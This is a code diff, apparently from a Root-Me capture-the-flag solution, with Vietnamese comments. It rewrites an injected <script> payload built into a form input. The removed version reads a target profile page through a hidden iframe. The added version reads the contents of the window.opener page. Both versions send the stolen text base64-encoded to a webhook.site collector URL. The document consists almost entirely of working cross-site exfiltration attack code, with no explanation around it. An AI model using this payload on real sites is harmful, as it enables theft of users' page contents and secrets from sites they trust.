@@ -22,18 +22,21 @@
         */
         input.value = `
 <script>
-    var ifr = document.createElement('iframe');
-    ifr.src = 'http://challenge01.root-me.org:58003/profile'; 
-    ifr.style.display = 'none';
-    ifr.onload = function() {
-        try {
-            var secretData = ifr.contentDocument.documentElement.innerText;
-            fetch('https://webhook.site/122cd883-0402-47a8-a264-d10c171c01ce?d=' + btoa(secretData));
-        } catch(e) {
-            fetch('https://webhook.site/122cd883-0402-47a8-a264-d10c171c01ce?err=' + btoa(e.message));
+(function(){
+    try {
+        // Kiểm tra xem có cửa sổ cha (opener) không
+        if (window.opener) {
+            // Lấy toàn bộ nội dung của trang đã mở ra trang này
+            var data = window.opener.document.documentElement.innerText;
+            fetch('https://webhook.site/122cd883-0402-47a8-a264-d10c171c01ce?flag=' + btoa(data));
+        } else {
+            // Nếu không có opener, thử quét các frame hoặc báo lỗi
+            fetch('https://webhook.site/122cd883-0402-47a8-a264-d10c171c01ce?err=no_opener');
         }
-    };
-    document.body.appendChild(ifr);
+    } catch(e) {
+        fetch('https://webhook.site/122cd883-0402-47a8-a264-d10c171c01ce?err=' + btoa(e.message));
+    }
+})();
 <\/script>`.replace(/\n/g, ""); // Xóa dấu xuống dòng để tránh lỗi syntax
 
         form.appendChild(input);
